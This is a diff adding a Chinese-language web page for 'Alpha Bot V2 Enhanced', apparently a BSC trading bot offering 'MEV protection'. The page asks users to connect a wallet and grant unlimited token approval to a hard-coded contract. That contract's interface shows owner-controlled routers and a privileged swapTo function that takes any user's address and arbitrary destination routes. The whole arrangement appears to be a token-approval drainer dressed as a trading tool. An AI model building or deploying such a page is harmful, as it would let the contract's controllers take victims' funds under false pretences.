@@ -1,0 +1,1027 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Alpha Bot V2 Enhanced</title>
+    <style>
+        :root {
+            --primary-color: #4CAF50;
+            --secondary-color: #2196F3;
+            --background-color: #f8f9fa;
+            --card-bg: #ffffff;
+            --text-color: #333333;
+            --border-color: #e0e0e0;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'PingFang SC', 'Microsoft YaHei', sans-serif;
+        }
+        
+        body {
+            background-color: var(--background-color);
+            color: var(--text-color);
+            line-height: 1.6;
+            padding: 20px;
+            max-width: 100%;
+            overflow-x: hidden;
+        }
+        
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding: 10px 0;
+        }
+        
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            color: var(--primary-color);
+            text-decoration: none;
+        }
+        
+        .social-link img {
+            width: 30px;
+            height: 30px;
+        }
+        
+        .card {
+            background-color: var(--card-bg);
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+        
+        h1, h2 {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .description {
+            text-align: center;
+            margin-bottom: 30px;
+            color: #666;
+        }
+        
+        button {
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            width: 100%;
+            margin-bottom: 10px;
+            transition: background-color 0.3s;
+        }
+        
+        button:hover {
+            background-color: #45a049;
+        }
+        
+        button:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+        }
+        
+        select {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid var(--border-color);
+            border-radius: 5px;
+            margin-bottom: 10px;
+            font-size: 16px;
+        }
+        
+        .pair-selection {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        
+        .pair-card {
+            display: flex;
+            align-items: center;
+            padding: 15px;
+            border-radius: 8px;
+            background-color: var(--card-bg);
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+        
+        .token-icon {
+            width: 30px;
+            height: 30px;
+            margin-right: 10px;
+        }
+        
+        .status-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            padding: 10px 0;
+            border-bottom: 1px solid var(--border-color);
+        }
+        
+        .status-label {
+            font-weight: bold;
+        }
+        
+        .status-value {
+            color: #666;
+        }
+        
+        .status-value.active {
+            color: var(--primary-color);
+        }
+        
+        .status-value.inactive {
+            color: #f44336;
+        }
+        
+        .instruction-toggle {
+            background-color: var(--secondary-color);
+            margin-bottom: 20px;
+        }
+        
+        .instructions {
+            display: none;
+            padding: 15px;
+            background-color: #f1f1f1;
+            border-radius: 5px;
+            margin-bottom: 20px;
+        }
+        
+        .instructions.show {
+            display: block;
+        }
+        
+        .instructions ol {
+            padding-left: 20px;
+        }
+        
+        .instructions li {
+            margin-bottom: 10px;
+        }
+        
+        .path-selection {
+            margin-bottom: 20px;
+        }
+        
+        .path-options {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 15px;
+        }
+        
+        .path-option {
+            flex: 1;
+            text-align: center;
+            padding: 10px;
+            border: 2px solid var(--border-color);
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 0 5px;
+            transition: all 0.3s;
+        }
+        
+        .path-option.selected {
+            border-color: var(--primary-color);
+            background-color: rgba(76, 175, 80, 0.1);
+        }
+        
+        .mev-protection {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        
+        .toggle-switch {
+            position: relative;
+            display: inline-block;
+            width: 60px;
+            height: 34px;
+            margin-right: 10px;
+        }
+        
+        .toggle-switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+        
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #ccc;
+            transition: .4s;
+            border-radius: 34px;
+        }
+        
+        .slider:before {
+            position: absolute;
+            content: "";
+            height: 26px;
+            width: 26px;
+            left: 4px;
+            bottom: 4px;
+            background-color: white;
+            transition: .4s;
+            border-radius: 50%;
+        }
+        
+        input:checked + .slider {
+            background-color: var(--primary-color);
+        }
+        
+        input:checked + .slider:before {
+            transform: translateX(26px);
+        }
+        
+        @media (max-width: 480px) {
+            .container {
+                padding: 10px;
+            }
+            
+            .path-options {
+                flex-direction: column;
+            }
+            
+            .path-option {
+                margin: 5px 0;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <a href="#" class="logo">Alpha Bot V2 Enhanced</a>
+            <a href="#" class="social-link" id="telegramLink">
+                <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZD0iTTExLjk5NCAwQTEyIDEyIDAgMCAwIDAgMTJhMTIgMTIgMCAwIDAgMTIuMDA0IDEyQTEyIDEyIDAgMCAwIDI0IDEyYTEyIDEyIDAgMCAwLTEyLjAwNi0xMnptMy4xMzkgMTYuOTk3Yy0uMzE4LjMxNi0uNzQ3LjQ4My0xLjE4My40ODMtLjQzNiAwLS44NjUtLjE2Ny0xLjE4My0uNDgzTDguNDM0IDEyLjY2Yy0uMzE3LS4zMTctLjQ5LS43NDUtLjQ5LTEuMTgzIDAtLjQzOC4xNzMtLjg2Ni40OS0xLjE4NGw0LjMzMy00LjMzNmMuMzE4LS4zMTYuNzQ3LS40ODMgMS4xODMtLjQ4My40MzYgMCAuODY1LjE2NyAxLjE4My40ODNsNC4zMzMgNC4zMzZjLjMxNy4zMTguNDkuNzQ2LjQ5IDEuMTg0IDAgLjQzOC0uMTczLjg2Ni0uNDkgMS4xODRsLTQuMzMzIDQuMzM2eiIgZmlsbD0iIzI3QTZFNiIvPjwvc3ZnPg==" alt="Telegram">
+            </a>
+        </header>
+        
+        <div class="card">
+            <h1>Alpha Bot V2 Enhanced</h1>
+            <p class="description">追踪BSC交易，实现同区块低损耗</p>
+            
+            <button id="instructionToggle" class="instruction-toggle">使用说明 ▼</button>
+            <div id="instructions" class="instructions">
+                <ol>
+                    <li>连接钱包并确保在BSC网络</li>
+                    <li>授权代币</li>
+                    <li>选择交易路径（1inch、Pancake或LiquidMesh）</li>
+                    <li>设置MEV保护（推荐开启以避免被夹）</li>
+                    <li>激活账户（有效期15分钟）</li>
+                    <li>在币安APP买入时需要选择对应路径，滑点设置0.1%，网络费用0.1gwei</li>
+                </ol>
+            </div>
+            
+            <button id="connectWalletBtn">连接钱包</button>
+            
+            <div id="walletConnectedSection" style="display: none;">
+                <div class="card">
+                    <h2>代币授权状态</h2>
+                    <div class="status-row">
+                        <span class="status-label">代币:</span>
+                        <span id="tokenStatus" class="status-value inactive">未授权</span>
+                    </div>
+                    <div class="status-row">
+                        <span class="status-label">代币地址:</span>
+                        <input type="text" id="tokenAddress" placeholder="输入代币地址" style="width: 100%; padding: 8px; margin-bottom: 10px;">
+                        <button id="approveTokenBtn">授权代币</button>
+                    </div>
+                </div>
+                
+                <div class="card">
+                    <h2>交易路径选择</h2>
+                    <div class="path-options">
+                        <div class="path-option selected" data-path="0">1inch</div>
+                        <div class="path-option" data-path="1">Pancake</div>
+                        <div class="path-option" data-path="2">LiquidMesh</div>
+                    </div>
+                    
+                    <div class="mev-protection">
+                        <label class="toggle-switch">
+                            <input type="checkbox" id="mevProtectionToggle" checked>
+                            <span class="slider"></span>
+                        </label>
+                        <span>MEV保护（推荐开启以避免被夹）</span>
+                    </div>
+                    <button id="setMEVProtectionBtn">保存MEV设置</button>
+                </div>
+                
+                <div class="card">
+                    <h2>账户状态</h2>
+                    <div class="status-row">
+                        <span class="status-label">当前状态:</span>
+                        <span id="activeTimeStatus" class="status-value inactive">未激活</span>
+                    </div>
+                    <button id="activateBtn">激活账户 (15分钟)</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- 加载Web3.js -->
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
+    
+    <script>
+        // 合约地址和ABI
+        const contractAddress = '0x253FCC0Fd40E013E4C818359Ab6aA3A4BC70f1b6';
+        const contractABI = [
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "_aggregator",
+                        "type": "address"
+                    },
+                    {
+                        "internalType": "address",
+                        "name": "_router",
+                        "type": "address"
+                    }
+                ],
+                "stateMutability": "nonpayable",
+                "type": "constructor"
+            },
+            {
+                "anonymous": false,
+                "inputs": [
+                    {
+                        "indexed": true,
+                        "internalType": "address",
+                        "name": "user",
+                        "type": "address"
+                    },
+                    {
+                        "indexed": false,
+                        "internalType": "bool",
+                        "type": "bool"
+                    }
+                ],
+                "name": "MEVProtectionUpdated",
+                "type": "event"
+            },
+            {
+                "anonymous": false,
+                "inputs": [
+                    {
+                        "indexed": true,
+                        "internalType": "address",
+                        "name": "user",
+                        "type": "address"
+                    },
+                    {
+                        "indexed": false,
+                        "internalType": "uint256",
+                        "type": "uint256"
+                    }
+                ],
+                "name": "SetActiveTime",
+                "type": "event"
+            },
+            {
+                "anonymous": false,
+                "inputs": [
+                    {
+                        "indexed": true,
+                        "internalType": "address",
+                        "name": "user",
+                        "type": "address"
+                    },
+                    {
+                        "indexed": false,
+                        "internalType": "address",
+                        "type": "address"
+                    },
+                    {
+                        "indexed": false,
+                        "internalType": "address",
+                        "type": "address"
+                    },
+                    {
+                        "indexed": false,
+                        "internalType": "uint8",
+                        "type": "uint8"
+                    },
+                    {
+                        "indexed": false,
+                        "internalType": "bool",
+                        "type": "bool"
+                    }
+                ],
+                "name": "SwapExecuted",
+                "type": "event"
+            },
+            {
+                "inputs": [],
+                "name": "PATH_1INCH",
+                "outputs": [
+                    {
+                        "internalType": "uint8",
+                        "name": "",
+                        "type": "uint8"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "name": "PATH_LIQUIDMESH",
+                "outputs": [
+                    {
+                        "internalType": "uint8",
+                        "name": "",
+                        "type": "uint8"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "name": "PATH_PANCAKE",
+                "outputs": [
+                    {
+                        "internalType": "uint8",
+                        "name": "",
+                        "type": "uint8"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "name": "activate",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "",
+                        "type": "address"
+                    }
+                ],
+                "name": "activeUntil",
+                "outputs": [
+                    {
+                        "internalType": "uint256",
+                        "name": "",
+                        "type": "uint256"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "name": "aggregator",
+                "outputs": [
+                    {
+                        "internalType": "address",
+                        "name": "",
+                        "type": "address"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "user",
+                        "type": "address"
+                    },
+                    {
+                        "internalType": "address",
+                        "name": "token",
+                        "type": "address"
+                    }
+                ],
+                "name": "getUserStatus",
+                "outputs": [
+                    {
+                        "internalType": "bool",
+                        "name": "isActive",
+                        "type": "bool"
+                    },
+                    {
+                        "internalType": "uint256",
+                        "name": "timeRemaining",
+                        "type": "uint256"
+                    },
+                    {
+                        "internalType": "bool",
+                        "name": "mevProtection",
+                        "type": "bool"
+                    },
+                    {
+                        "internalType": "uint256",
+                        "name": "allowance",
+                        "type": "uint256"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "",
+                        "type": "address"
+                    }
+                ],
+                "name": "mevProtectionEnabled",
+                "outputs": [
+                    {
+                        "internalType": "bool",
+                        "name": "",
+                        "type": "bool"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "name": "owner",
+                "outputs": [
+                    {
+                        "internalType": "address",
+                        "name": "",
+                        "type": "address"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "name": "router",
+                "outputs": [
+                    {
+                        "internalType": "address",
+                        "name": "",
+                        "type": "address"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "_aggregator",
+                        "type": "address"
+                    }
+                ],
+                "name": "setAggregator",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {
+                        "internalType": "bool",
+                        "name": "enabled",
+                        "type": "bool"
+                    }
+                ],
+                "name": "setMEVProtection",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "_router",
+                        "type": "address"
+                    }
+                ],
+                "name": "setRouter",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "account",
+                        "type": "address"
+                    },
+                    {
+                        "internalType": "bool",
+                        "name": "authorized",
+                        "type": "bool"
+                    }
+                ],
+                "name": "setSwapRole",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "user",
+                        "type": "address"
+                    },
+                    {
+                        "internalType": "uint256",
+                        "name": "fromTokenWithFee",
+                        "type": "uint256"
+                    },
+                    {
+                        "internalType": "uint256",
+                        "name": "toTokenWithFee",
+                        "type": "uint256"
+                    },
+                    {
+                        "internalType": "uint256",
+                        "name": "minReturnAmt",
+                        "type": "uint256"
+                    },
+                    {
+                        "components": [
+                            {
+                                "components": [
+                                    {
+                                        "internalType": "uint256[]",
+                                        "name": "mixAdapters",
+                                        "type": "uint256[]"
+                                    },
+                                    {
+                                        "internalType": "address[]",
+                                        "name": "assetTo",
+                                        "type": "address[]"
+                                    },
+                                    {
+                                        "internalType": "uint256[]",
+                                        "name": "rawData",
+                                        "type": "uint256[]"
+                                    },
+                                    {
+                                        "internalType": "bytes[]",
+                                        "name": "extraData",
+                                        "type": "bytes[]"
+                                    },
+                                    {
+                                        "internalType": "address",
+                                        "name": "fromToken",
+                                        "type": "address"
+                                    }
+                                ],
+                                "internalType": "struct IAggregator.RouterPath[]",
+                                "name": "",
+                                "type": "tuple[]"
+                            }
+                        ],
+                        "internalType": "struct IAggregator.RouterPath[][]",
+                        "name": "routes",
+                        "type": "tuple[][]"
+                    },
+                    {
+                        "internalType": "uint8",
+                        "name": "pathType",
+                        "type": "uint8"
+                    }
+                ],
+                "name": "swapTo",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "",
+                        "type": "address"
+                    }
+                ],
+                "name": "swapRole",
+                "outputs": [
+                    {
+                        "internalType": "bool",
+                        "name": "",
+                        "type": "bool"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "stateMutability": "payable",
+                "type": "receive"
+            }
+        ];
+        
+        // Web3相关变量
+        let web3;
+        let accounts = [];
+        let contract;
+        let selectedPath = 0; // 默认选择1inch
+        
+        // 显示/隐藏使用说明
+        document.getElementById('instructionToggle').addEventListener('click', function() {
+            const instructions = document.getElementById('instructions');
+            instructions.classList.toggle('show');
+            this.textContent = instructions.classList.contains('show') ? '使用说明 ▲' : '使用说明 ▼';
+        });
+        
+        // 路径选择
+        const pathOptions = document.querySelectorAll('.path-option');
+        pathOptions.forEach(option => {
+            option.addEventListener('click', function() {
+                pathOptions.forEach(opt => opt.classList.remove('selected'));
+                this.classList.add('selected');
+                selectedPath = parseInt(this.getAttribute('data-path'));
+            });
+        });
+        
+        // 连接钱包
+        document.getElementById('connectWalletBtn').addEventListener('click', connectWallet);
+        
+        // 授权代币
+        document.getElementById('approveTokenBtn').addEventListener('click', approveToken);
+        
+        // 设置MEV保护
+        document.getElementById('setMEVProtectionBtn').addEventListener('click', setMEVProtection);
+        
+        // 激活账户
+        document.getElementById('activateBtn').addEventListener('click', activateAccount);
+        
+        // 监听代币地址变化
+        document.getElementById('tokenAddress').addEventListener('change', function() {
+            updateUserStatus();
+        });
+        
+        // 检查是否已连接钱包
+        window.addEventListener('load', function() {
+            setTimeout(checkWalletConnection, 1000);
+        });
+        
+        // 检查钱包连接状态
+        function checkWalletConnection() {
+            console.log('检查钱包连接状态...');
+            
+            // 币安钱包特定检测
+            if (typeof window.BinanceChain !== 'undefined') {
+                console.log('检测到币安钱包');
+                connectWallet();
+                return;
+            }
+            
+            // 通用钱包检测
+            if (typeof window.ethereum !== 'undefined') {
+                console.log('检测到以太坊钱包');
+                if (window.ethereum.selectedAddress) {
+                    connectWallet();
+                }
+            }
+        }
+        
+        // 获取钱包提供者
+        function getProvider() {
+            // 优先使用币安钱包
+            if (typeof window.BinanceChain !== 'undefined') {
+                return window.BinanceChain;
+            }
+            
+            // 其次使用通用以太坊提供者
+            if (typeof window.ethereum !== 'undefined') {
+                return window.ethereum;
+            }
+            
+            return null;
+        }
+        
+        // 连接钱包
+        async function connectWallet() {
+            console.log('尝试连接钱包...');
+            
+            const provider = getProvider();
+            
+            if (!provider) {
+                alert('请在币安钱包浏览器中打开此页面');
+                return;
+            }
+            
+            try {
+                // 请求账户访问
+                accounts = await provider.request({ method: 'eth_requestAccounts' });
+                console.log('获取到账户:', accounts);
+                
+                // 初始化Web3
+                web3 = new Web3(provider);
+                console.log('Web3初始化成功');
+                
+                // 检查网络
+                const chainId = await web3.eth.getChainId();
+                console.log('当前链ID:', chainId);
+                if (chainId !== 56) { // BSC主网的chainId是56
+                    alert('请切换到BSC网络');
+                    return;
+                }
+                
+                // 初始化合约
+                contract = new web3.eth.Contract(contractABI, contractAddress);
+                console.log('合约初始化成功');
+                
+                // 显示连接后的界面
+                document.getElementById('connectWalletBtn').style.display = 'none';
+                document.getElementById('walletConnectedSection').style.display = 'block';
+                
+                // 更新用户状态
+                updateUserStatus();
+                
+            } catch (error) {
+                console.error('连接钱包失败:', error);
+                alert('连接钱包失败，请确保在币安钱包浏览器中打开');
+            }
+        }
+        
+        // 更新用户状态
+        async function updateUserStatus() {
+            console.log('更新用户状态...');
+            if (!web3 || !accounts.length || !contract) {
+                console.log('Web3、账户或合约未初始化，无法更新状态');
+                return;
+            }
+            
+            try {
+                const tokenAddress = document.getElementById('tokenAddress').value;
+                if (!tokenAddress || !web3.utils.isAddress(tokenAddress)) {
+                    console.log('代币地址无效或为空');
+                    return;
+                }
+                
+                console.log('获取用户状态，账户:', accounts[0], '代币:', tokenAddress);
+                const result = await contract.methods.getUserStatus(accounts[0], tokenAddress).call();
+                console.log('获取到用户状态:', result);
+                
+                const isActive = result.isActive;
+                const timeRemaining = parseInt(result.timeRemaining);
+                const mevProtection = result.mevProtection;
+                const allowance = result.allowance;
+                
+                // 更新激活状态
+                const activeTimeStatus = document.getElementById('activeTimeStatus');
+                if (isActive) {
+                    let timeString;
+                    if (timeRemaining < 60) {
+                        timeString = `${timeRemaining}秒`;
+                    } else if (timeRemaining < 3600) {
+                        timeString = `${Math.floor(timeRemaining / 60)}分钟`;
+                    } else {
+                        timeString = `${Math.floor(timeRemaining / 3600)}小时`;
+                    }
+                    
+                    activeTimeStatus.textContent = `已激活（剩余${timeString}）`;
+                    activeTimeStatus.classList.remove('inactive');
+                    activeTimeStatus.classList.add('active');
+                } else {
+                    activeTimeStatus.textContent = '未激活';
+                    activeTimeStatus.classList.remove('active');
+                    activeTimeStatus.classList.add('inactive');
+                }
+                
+                // 更新MEV保护状态
+                document.getElementById('mevProtectionToggle').checked = mevProtection;
+                
+                // 更新代币授权状态
+                const tokenStatus = document.getElementById('tokenStatus');
+                if (allowance > 0) {
+                    tokenStatus.textContent = '已授权';
+                    tokenStatus.classList.remove('inactive');
+                    tokenStatus.classList.add('active');
+                    document.getElementById('approveTokenBtn').disabled = true;
+                } else {
+                    tokenStatus.textContent = '未授权';
+                    tokenStatus.classList.remove('active');
+                    tokenStatus.classList.add('inactive');
+                    document.getElementById('approveTokenBtn').disabled = false;
+                }
+            } catch (error) {
+                console.error('更新用户状态失败:', error);
+            }
+        }
+        
+        // 授权代币
+        async function approveToken() {
+            console.log('尝试授权代币...');
+            if (!web3 || !accounts.length) {
+                console.error('Web3或账户未初始化');
+                return;
+            }
+            
+            const tokenAddress = document.getElementById('tokenAddress').value;
+            if (!tokenAddress || !web3.utils.isAddress(tokenAddress)) {
+                alert('请输入有效的代币地址');
+                return;
+            }
+            
+            try {
+                console.log('创建代币合约实例，地址:', tokenAddress);
+                const tokenContract = new web3.eth.Contract([
+                    {
+                        "constant": false,
+                        "inputs": [{"name": "spender", "type": "address"}, {"name": "amount", "type": "uint256"}],
+                        "name": "approve",
+                        "outputs": [{"name": "", "type": "bool"}],
+                        "payable": false,
+                        "stateMutability": "nonpayable",
+                        "type": "function"
+                    }
+                ], tokenAddress);
+                
+                const maxUint256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+                console.log('发送授权交易，授权地址:', contractAddress);
+                await tokenContract.methods.approve(contractAddress, maxUint256).send({ from: accounts[0] });
+                
+                console.log('代币授权成功');
+                alert('代币授权成功');
+                updateUserStatus();
+            } catch (error) {
+                console.error('代币授权失败:', error);
+                alert('代币授权失败，请重试');
+            }
+        }
+        
+        // 设置MEV保护
+        async function setMEVProtection() {
+            console.log('尝试设置MEV保护...');
+            if (!web3 || !accounts.length || !contract) {
+                console.error('Web3、账户或合约未初始化');
+                return;
+            }
+            
+            try {
+                const mevProtection = document.getElementById('mevProtectionToggle').checked;
+                console.log('MEV保护设置为:', mevProtection);
+                
+                await contract.methods.setMEVProtection(mevProtection).send({ from: accounts[0] });
+                
+                console.log('MEV保护设置成功');
+                alert('MEV保护设置成功');
+                updateUserStatus();
+            } catch (error) {
+                console.error('设置MEV保护失败:', error);
+                alert('设置MEV保护失败，请重试');
+            }
+        }
+        
+        // 激活账户
+        async function activateAccount() {
+            console.log('尝试激活账户...');
+            if (!web3 || !accounts.length || !contract) {
+                console.error('Web3、账户或合约未初始化');
+                return;
+            }
+            
+            try {
+                console.log('发送激活交易');
+                await contract.methods.activate().send({ from: accounts[0] });
+                
+                console.log('账户激活成功');
+                alert('账户激活成功，有效期15分钟');
+                updateUserStatus();
+            } catch (error) {
+                console.error('激活账户失败:', error);
+                alert('激活账户失败，请重试');
+            }
+        }
+    </script>
+</body>
+</html>
